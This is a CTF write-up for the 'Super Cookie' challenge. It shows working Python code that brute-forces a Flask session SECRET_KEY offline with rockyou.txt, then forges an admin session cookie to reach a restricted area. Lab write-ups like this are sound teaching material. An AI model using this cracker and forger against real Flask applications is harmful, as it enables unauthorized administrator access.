---
title: 'InIt CTF: Super Cookie'
author: AmcaQt
categories: [InIt CTF]
tags: [Web, Flask, Session Forgery, Cryptography]
render_with_liquid: false
media_subpath: /images/init-ctf-super-cookie/
image:
  path: challenge_card.png
---

![Challenge card](challenge_card.png)
_<http://172.198.60.104:3000>_

## Description

A small office story archive with an administrator area that is restricted to authorized staff. The cookie is unsafe somewhere, but can I really get admin access if the cookie is unsafe?

100 points, 126 solves.

![Story archive front page](story_archive.png)

Just a little office story blog. No handout, straight to the live site.

## Question & Flag

### Recon

Challenge name is literally "Super Cookie" and the description keeps hammering on "the cookie is unsafe", so cookies are obviously the angle. Before touching anything, checked `robots.txt` first, standard recon habit, and it paid off immediately:

```
User-agent: *
Disallow: /admin/8f14e45f-ea9d-4b21-9c6d-62f8f7a6c311
```

Could've been a plain hidden admin panel with a UUID in the path for obscurity, but given the challenge name, figured it wouldn't be that simple.

### Wrong creds, right lead

Hit the disclosed admin path and tried the laziest possible login, `admin:admin`. Got rejected with "Wrong username or password", but the response still set a session cookie, so popped it open in Burp to see what was actually in it.

The cookie is a standard Flask session, three dot-separated base64 segments, payload / timestamp / HMAC signature:

```
eyJyb2xlIjoiZ3Vlc3QiLCJ1c2VybmFtZSI6InZpc2l0b3IifQ.avsqLA.g-eY45F3u1Z0-zBt8UZg75BFD5Y
```

![Server reissuing a guest session cookie](guest_cookie_response.png)

Decoding just the first segment (base64) gives `{"role":"guest","username":"visitor"}` in plain text, no encryption, Flask sessions are signed, not encrypted. So the server trusts whatever role is in this cookie, as long as the signature checks out. The whole game is now: find the signing secret, then sign my own `{"role":"admin"}` payload with it.

### Cracking the signing secret

Flask signs session cookies with `itsdangerous`, using `SECRET_KEY` as the HMAC key and a fixed salt (`"cookie-session"`) for the session serializer. If that secret key is a weak/guessable string, the signature is crackable offline: just replicate the exact same signer, try candidate secrets, and see if the decoded payload parses as valid session data.

```python
import sys, hashlib, multiprocessing as mp
from itsdangerous import URLSafeTimedSerializer
from flask.json.tag import TaggedJSONSerializer

COOKIE = "eyJyb2xlIjoiZ3Vlc3QiLCJ1c2VybmFtZSI6InZpc2l0b3IifQ.avsqLA.g-eY45F3u1Z0-zBt8UZg75BFD5Y"

def make_serializer(secret):
    return URLSafeTimedSerializer(
        secret,
        salt="cookie-session",
        serializer=TaggedJSONSerializer(),
        signer_kwargs={"key_derivation": "hmac", "digest_method": staticmethod(hashlib.sha1)},
    )

def check(secret):
    try:
        s = make_serializer(secret)
        data = s.loads(COOKIE)
        return (secret, data)
    except Exception:
        return None
```

Multiprocessed the whole thing across every CPU core and fed it rockyou.txt as the wordlist, since `signer_kwargs` has to exactly match Flask's defaults (`hmac` key derivation, SHA-1 digest) or every single guess fails to verify regardless of whether the secret is right.

```
$ python3 solve.py /usr/share/wordlists/rockyou.txt
Using 8 processes
Loaded 14344374 candidates
progress: 0/14344374
FOUND SECRET: secret123
DATA: {'role': 'guest', 'username': 'visitor'}
```

![Cracking the signing secret with rockyou](crack_secret_terminal.png)

`secret123`. Found it fast, rockyou barely had to work.

### Forging the admin cookie

With the real `SECRET_KEY` in hand, signing my own session is just calling the same serializer in the forward direction instead of cracking it:

```python
import hashlib
from itsdangerous import URLSafeTimedSerializer
from flask.json.tag import TaggedJSONSerializer

SECRET = "secret123"

s = URLSafeTimedSerializer(
    SECRET,
    salt="cookie-session",
    serializer=TaggedJSONSerializer(),
    signer_kwargs={"key_derivation": "hmac", "digest_method": staticmethod(hashlib.sha1)},
)

forged = s.dumps({"role": "admin", "username": "admin"})
print(forged)
```

```
eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImFkbWluIn0.avsrMw.IicO9HtilB8QoUv5-1ncDbWATvY
```

A perfectly valid, correctly signed session cookie claiming to be an admin, that the server has no way to tell apart from a real one, since the signature checks out against its own secret.

### Cashing it in

Swapped the `session` cookie in Burp for the forged one and resent the exact same admin login request:

![Forged admin cookie returning the flag](forged_admin_flag.png)

```
InIt{C00k1e_F0rg3ry_1s_Sup3r}
```

## Conclusion

Flask session cookies are signed, not encrypted, so anyone can read the role/username fields straight out of the cookie with zero effort, that part's by design and fine. The actual bug is the weak `SECRET_KEY`. If that key is crackable, the signature stops meaning anything, and the client can just write whatever session data it wants and sign it correctly itself. The entire admin check collapses to "does the user know our one shared secret", and `secret123` was never going to survive a rockyou run.

# Happy Hacking

![Happy Hacking](https://i.pinimg.com/736x/c8/ba/10/c8ba1046301057db438519de92035df7.jpg)
